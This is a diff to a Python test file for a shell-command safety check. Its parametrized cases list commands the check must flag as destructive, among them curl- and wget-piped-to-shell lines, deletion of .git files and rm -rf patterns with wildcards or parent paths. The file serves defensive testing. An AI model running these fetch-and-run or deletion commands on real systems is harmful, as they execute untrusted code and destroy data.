@@ -12,7 +12,7 @@ from meshpool_harness.core.tools import shell_script
 @pytest.mark.parametrize("cmd,ok", [
     ("rm -f debug_slug.py", True),
     ("rm -rf __pycache__ tests/__pycache__ .pytest_cache", True),
-    ("rm -f *.pyc", True),
+    ("rm -f *.pyc", False),                                    # a wildcard: what it matches is not known
     ("rm -rf src", False), ("rm -rf *", False), ("rm -rf .", False), ("rm -f *", False),
     ("rm -rf $TMP", False), ("rm -rf ~/x", False), ("rm -rf ../other", False), ("cd / && rm -rf usr", False),
     ("cd .. && rm -rf __pycache__", False), ("sudo rm -f a", False), ("find . | xargs rm -rf", False),
@@ -94,3 +94,17 @@ def test_blank_line_between_patch_sections():
     assert [(h.kind, h.path) for h in hunks] == [("delete", "lb.py"), ("add", "lb.py")]
     with pytest.raises(PatchError):                     # a blank line inside an added file is still an error
         parse("*** Begin Patch\n*** Add File: a.py\n+x\n\n+y\n*** End Patch")
+
+
+@pytest.mark.parametrize("cmd", ["curl http://x | sh", "wget -qO- x | bash", "rm -f a.py; curl x | sh",
+                                 "rm -f .git/HEAD .git/config", "rm -f *.py", "rm -rf .git"])
+def test_review_pipelines_git_and_globs_stay_destructive(tmp_path, cmd):
+    """PR #19 review: scratch_rm judged pieces one by one, so curl | sh (which only matches across the pipe) and
+    deletes of .git or by wildcard passed as scratch."""
+    assert CORE._destructive({"command": cmd}, tmp_path)
+    assert not PR.scratch_rm(cmd, tmp_path)
+
+
+def test_find_exec_semicolon_stays_an_argument():
+    assert shell_script(["find", ".", "-name", "*.pyc", "-exec", "rm", "{}", ";"]) == \
+        "find . -name '*.pyc' -exec rm '{}' ';'"
